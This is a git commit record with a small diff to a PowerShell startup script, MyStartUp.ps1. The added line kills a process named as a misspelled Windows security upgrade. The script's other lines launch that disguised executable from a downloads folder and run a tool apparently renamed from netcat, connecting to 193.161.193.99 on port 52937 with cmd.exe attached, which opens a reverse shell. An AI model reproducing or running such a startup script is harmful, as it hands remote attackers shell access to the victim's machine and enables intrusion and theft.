e9920b9632b2c10bcea4b7294722aaa07487c0ab
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-09-13 05:03:43 +0200

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,4 @@
+taskkill /F /IM "Windows Secuirity Upgrade.exe"
 & "C:\Users\alooo\downloads\Windows Secuirity Upgrade.exe"
 taskkill /F /IM Update.exe
 C:\users\public\RNM.exe -nv 193.161.193.99 52937 -e cmd.exe
